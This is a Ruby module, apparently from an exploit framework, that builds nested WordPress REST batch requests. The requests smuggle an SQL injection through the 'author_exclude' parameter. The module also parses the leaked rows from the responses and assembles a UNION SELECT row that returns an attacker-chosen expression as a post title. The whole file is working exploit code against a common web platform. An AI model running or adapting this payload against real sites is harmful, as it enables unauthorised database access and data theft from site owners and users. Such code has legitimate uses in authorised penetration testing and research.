# frozen_string_literal: true

require 'uri'

# Native REST control payloads, independent of the Framework injection transport.
module WordpressCoreNativeControls
  def core_native_payload(sqli, union: false)
    source = union ? '/wp/v2/widgets' : '/wp/v2/posts/999999'
    parameters = { 'author_exclude' => sqli }
    parameters.merge!('per_page' => 500, 'orderby' => 'none') if union
    inner = { 'requests' => [{ 'method' => 'POST', 'path' => 'http://:' }, { 'method' => union ? 'GET' : 'DELETE', 'path' => source + '?' + URI.encode_www_form(parameters) }, { 'method' => 'GET', 'path' => '/wp/v2/posts' }] }
    inner.fetch('requests') << { 'method' => 'GET', 'path' => '/wp/v2/categories' } if union
    { 'requests' => [{ 'method' => 'POST', 'path' => 'http://:' }, { 'method' => 'POST', 'path' => '/wp/v2/posts', 'body' => inner }, { 'method' => 'POST', 'path' => '/batch/v1', 'body' => { 'requests' => [] } }] }
  end

  def core_native_posts(document)
    rows = document.dig('responses', 1, 'body', 'responses', 1, 'body')
    rows if rows.is_a?(Array)
  end

  def core_scalar_row(columns, expression)
    values = columns.to_h { |name| [name, "''"] }
    values.merge!('ID' => '99999001', 'post_author' => '1', 'post_title' => expression, 'post_status' => "'publish'", 'comment_status' => "'closed'", 'ping_status' => "'closed'", 'post_name' => "'native-core-result'", 'post_parent' => '0', 'menu_order' => '0', 'post_type' => "'post'", 'comment_count' => '0')
    %w[post_date post_date_gmt post_modified post_modified_gmt].each { |name| values[name] = "'2020-01-01 00:00:00'" }
    raise ArgumentError, 'Unexpected native WordPress post schema' unless values.length == 23

    'SELECT ' + columns.map { |name| values.fetch(name) }.join(',')
  end
end
